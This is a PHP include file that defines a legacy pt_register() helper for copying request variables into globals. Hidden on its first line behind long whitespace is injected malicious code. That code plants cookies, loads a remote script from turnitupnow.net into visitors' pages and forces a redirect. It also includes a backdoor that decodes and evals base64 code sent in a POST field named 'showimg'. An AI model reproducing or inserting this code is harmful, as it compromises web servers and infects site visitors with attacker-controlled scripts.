<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


function pt_register()
{
  $num_args = func_num_args();
   $vars = array();

   if ($num_args >= 2) {
       $method = strtoupper(func_get_arg(0));

       if (($method != 'SESSION') && ($method != 'GET') && ($method != 'POST') && ($method != 'SERVER') && ($method != 'COOKIE') && ($method != 'ENV')) {
           die('The first argument of pt_register must be one of the following: GET, POST, SESSION, SERVER, COOKIE, or ENV');
     }

       $varname = "HTTP_{$method}_VARS";
      global ${$varname};

       for ($i = 1; $i < $num_args; $i++) {
           $parameter = func_get_arg($i);

           if (isset(${$varname}[$parameter])) {
               global $$parameter;
               $$parameter = ${$varname}[$parameter];
          }

       }

   } else {
       die('You must specify at least two arguments');
   }

}

?>
